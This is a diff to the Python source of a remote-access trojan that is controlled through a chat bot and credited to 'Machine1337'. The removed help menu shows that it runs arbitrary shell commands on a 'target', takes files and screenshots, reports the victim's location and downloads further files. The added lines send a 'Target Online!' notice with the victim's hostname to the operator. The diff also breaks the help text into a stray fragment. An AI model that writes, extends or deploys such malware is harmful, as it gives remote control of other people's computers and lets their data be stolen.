@@ -86,16 +86,7 @@ def execute_command(command):
             return f"Error taking screenshot: {e}"
     elif command == 'help':
         return '''
-        HELP MENU: Coded By Machine1337
-CMD Commands        | Execute cmd commands directly in bot
-cd ..               | Change the current directory
-cd foldername       | Change to current folder
-download filename   | Download File From Target
-screenshot          | Capture Screenshot
-info                | Get System Info
-location            | Get Target Location
-get url             | Download File From URL (provide direct link)
-            '''
+        s'''
     elif command.startswith('download '):
         filename = command[
                    9:].strip()
@@ -129,7 +120,7 @@ get url             | Download File From URL (provide direct link)
     else:
         try:
             result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-            return result.decode('utf-8').strip()
+            return result.decode('utf-8').strip()  
         except subprocess.CalledProcessError as e:
             return f"Command execution failed. Error: {e.output.decode('utf-8').strip()}"
 
@@ -169,8 +160,18 @@ def send_message(text):
     response = requests.get(url, params=params)
     if response.status_code != 200:
         print(f"Failed to send message.")
+
+def send_online_notification():
+    try:
+        hostname = platform.node()
+        notification_text = f" **Target Online!**\n\n**Hostname:** {hostname}"
+        send_message(notification_text)
+    except Exception as e:
+        send_message(f"Target Online, but failed to get hostname: {e}")
+
 def main():
     offset = None
+    send_online_notification()
     while True:
         updates = get_updates(offset)
         if updates:
@@ -181,4 +182,3 @@ def main():
         time.sleep(1)
 if __name__ == '__main__':
     main()
-#coded by machine1337. Don't copy this cod
